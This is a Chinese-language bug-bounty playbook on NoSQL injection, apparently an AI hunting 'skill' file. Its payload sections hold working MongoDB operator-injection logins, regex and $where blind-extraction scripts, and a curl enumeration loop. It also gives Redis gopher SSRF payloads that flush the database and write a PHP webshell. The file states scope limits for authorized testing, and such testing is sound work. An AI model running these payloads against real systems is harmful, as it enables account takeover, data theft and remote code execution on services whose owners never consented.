# NoSQL 注入（NoSQLi）

> 把「JSON 查询对象」当成「键值」塞给服务端，篡改 MongoDB/CouchDB/Redis 的查询语义。认证绕过（登录成 admin）= Critical；拖出整个用户集合 = High；纯盲注无有效外带 = Medium。典型赏金：认证绕过 $5,000、$where 数据外带 $10,000、Redis SSRF→RCE $15,000（14 份披露报告提炼）。

**取材来源**（本文件内容改编自，非整库复制）：
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（14 份披露报告）
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（6 条 pattern + 赏金）
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)（MongoDB / Redis 段）
- 权威公开源：HackTricks（NoSQL injection）/ PayloadsAllTheThings

---

## 1. 触发信号

- 接口收 JSON body（`POST /api/login` `{"username":..,"password":..}`），或 URL 参数 `?q=` `?filter=` `?where=`
- 技术栈信号：`X-Powered-By: Express`（Node+Mongo 常见栈）、JS bundle 里出现 mongoose/monk、响应回显 MongoDB 错误
- CouchDB `/_utils` UI 暴露（Futon/Fauxton）、Redis 6379 可达（经 SSRF）、Elasticsearch 9200 可达 `[Claude-BugHunter]`
- 把参数值换成对象/数组后，响应从「未找到」变为「命中/返回多条」或响应时间显著变长

## 2. 高频入口点

**URL / 参数模式** `[Claude-BugHunter]`：

```text
/api/users/login            POST + JSON body（username/password）
/api/search?q=              /api/find?filter=      /api/query?where=
任何接受 JSON body 且含 username/password 的端点
```

**高危点特征**：登录接口（`findOne({username, password})` 无净化 → 运算符注入）、列表/搜索接口（`$regex` 逐字符枚举）、忘记密码接口（`$regex` 批量触发重置）。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **确认后端**：正常 JSON 登录一次；把 `password` 值改成 `{"$ne":""}`，若返回 200 + 有效 token = MongoDB 运算符注入确认。
2. **认证绕过**：`{"username":{"$gt":""},"password":{"$gt":""}}` 登录为集合第一个用户（通常是 admin）。
3. **盲注逐字符**：搜索接口 `{"username":{"$regex":"^a"}}` 逐步加前缀，按命中/未命中差异枚举数据；或用 `$where` 时间盲（5s 延时）确认 JS 执行。
4. **横向**：URL 参数 `role[$ne]=user` 看是否越权返回所有角色；忘记密码接口 `$regex` 测批量重置。
5. **NoSQL 型 SSRF / DoS**：已确认 SSRF 时探内网 Redis（gopher://），`CONFIG SET` → 写 webshell / `SLAVEOF` 外带；`$where` 可跑死循环造成 DoS。

## 4. Payload 区（每条标注出处）

### 4.1 MongoDB 运算符注入（$ne / $gt / $regex / $where / $or）`[本地 src-hunter / Claude-BugHunter]`

```json
{"username":"admin","password":{"$ne":""}}          // 不等于：绕过密码校验
{"username":"admin","password":{"$gt":""}}          // 大于空串：匹配任意非空密码
{"username":{"$ne":""},"password":{"$ne":""}}        // 双 $ne：登录第一个用户
{"username":"admin","password":{"$or":[{"password":"realpass"},{"1":"1"}]}}  // $or 逻辑注入
{"username":{"$regex":"^admin"},"password":{"$ne":""}}  // 正则匹配用户名
{"$where":"this.username == 'admin' && this.password.match(/.*/)"}  // JS 注入
```

### 4.2 认证绕过 `[Claude-BugHunter]`

```bash
# 大于空串 —— 登为集合第一个用户（通常 admin）
curl -s -X POST https://target/api/login -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
# 正则通配任意用户名
-d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'
# ne 绕过（指定 admin，密码不等于错误值即通过）
-d '{"username": "admin", "password": {"$ne": "wrong"}}'
# in 数组爆破用户名
-d '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": "x"}}'
```

### 4.3 盲注逐字符 `[本地 src-hunter / Claude-BugHunter]`

```text
# $regex 前缀枚举（命中→逐步加字符）
{"username": {"$regex": "^a"}}
{"username": {"$regex": "^ad"}}
{"username": {"$regex": "^adm"}}

# URL 参数数组记法（绕过 JSON.parse 拒绝对象）
GET /api/users?username[$gt]=&password[$gt]=
GET /api/search?q[$regex]=.*&q[$options]=i

# $where 时间盲（5s 延时探测 + 数据外带）
{"q":{"$where":"function(){var d=new Date();while(new Date()-d<5000){}; return true;}"}}
{"q":{"$where":"function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"}}
```

```bash
# 逐字符枚举用户名（按响应长度差）
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  RESP=$(curl -s -X POST https://target/api/users -H "Content-Type: application/json" \
    -d "{\"username\": {\"\$regex\": \"^$c\"}}")
  echo "$c: $(echo $RESP | wc -c)"
done
```

### 4.4 NoSQL 型 SSRF / DoS（Redis / CouchDB）`[Claude-BugHunter]`

```bash
# 已有 SSRF → 探内网 Redis，gopher:// 封装 RESP 协议
curl "https://target/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"
# CONFIG SET 写 webshell（Redis 有 webroot 写权限时）
gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html%0d%0a
gopher://127.0.0.1:6379/_CONFIG SET dbfilename shell.php%0d%0a
gopher://127.0.0.1:6379/_SET x "<?php system($_GET[cmd]); ?>"%0d%0a
gopher://127.0.0.1:6379/_BGSAVE%0d%0a
# 或用 SLAVEOF 指向攻击者 Redis 做 OOB 数据外带

# CouchDB 管理 API 未授权（:5984）
curl http://target.com:5984/_all_dbs
curl http://target.com:5984/users/_all_docs
curl http://target.com:5984/users/DOCUMENT_ID
```

> `$where` 可执行任意 JS（`while(true){}` 死循环 → 数据库进程 DoS），仅授权且非生产验证。

### 4.5 Bypass 矩阵 `[Claude-BugHunter]`

| 拦 | 绕 |
|---|---|
| `JSON.parse` 拒绝对象值 | URL 参数数组记法：`password[$ne]=x` |
| 净化 `$` 前缀 | Unicode/Hex：`$ne` / `{"username":{"$ne":""}}` `[本地 src-hunter]` |
| 类型检查 password 必须是字符串 | 嵌套：`{"password":{"$gt":"","$lt":"~"}}` |
| 拦截运算符 key | 嵌套更深的 object 结构 |
| mongoose 净化插件 | 检查插件是否覆盖所有 model |

## 5. 工具用法

```bash
# nosqlmap 认证绕过（attack 1）/ 数据提取（attack 2）
pip3 install nosqlmap
nosqlmap -u "https://target/api/login" --attack 1 --httpMethod POST \
  --postData '{"username":"INJECT","password":"test"}'
nosqlmap -u "https://target/api/login" --attack 2

# 手工认证绕过
curl -s -X POST https://target/api/login -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# URL 参数测试
curl "https://target/api/users?username[$gt]=&password[$gt]="
```

> 纪律：手工确认后再用 nosqlmap 扩大覆盖；盲注逐字符用二分而非全字符集线性爆破；不跑 `$where` 死循环。

## 6. 证据要求

**「已确认」判据** `[Claude-BugHunter]`：
- 认证绕过：**无有效凭据**登录成功并拿到有效 session token。
- 数据 dump：返回了本不该访问的 documents/用户。
- 盲注：时间延时 >4s 且一致可复现（>4s 才算，非单次抖动）。

**PoC 模板**：

```http
POST /api/v1/auth/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": {"$gt": ""}, "password": {"$gt": ""}}
→ 200 OK + JWT token（对应集合第一个用户 admin），无凭据登录成功
```

**CVSS / 严重度参考**：认证绕过（admin）`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N ≈ 9.1`；用户集合 dump `C:H ≈ 7.5`；纯盲注（无有效外带）`C:L ≈ 5.3`；Redis SSRF→RCE `= 9.8`（严重度标签见 hunt-nosqli：认证绕过 Critical / dump High / 盲注 Medium）。

## 7. 合规边界 / 不要做的事

- **禁**：认证绕过后登录目标后台实际操作——拿到有效 token 即停，不点任何功能。
- **禁**：dump 整个用户集合。只取 1–3 条样本（脱敏），不批量枚举全部 email/密码。
- **禁**：`$where` 跑 `while(true)` 死循环 / 高开销聚合，仅用 `<5000ms` 延时做「探测能力」证明。
- **禁**：通过 SSRF 实际写 Redis webshell / `SLAVEOF` 外带 / `flushall`；「证明能打到 6379 + CONFIG SET」即可，不改写目标数据。
- **禁**：忘记密码接口 `$regex` 批量触发真实重置（会 DoS 用户），仅在测试账号上验证。
- **脱敏**：报告中 username/password 只留前 2 + 后 2 字符；session token 只写前 8 字符。
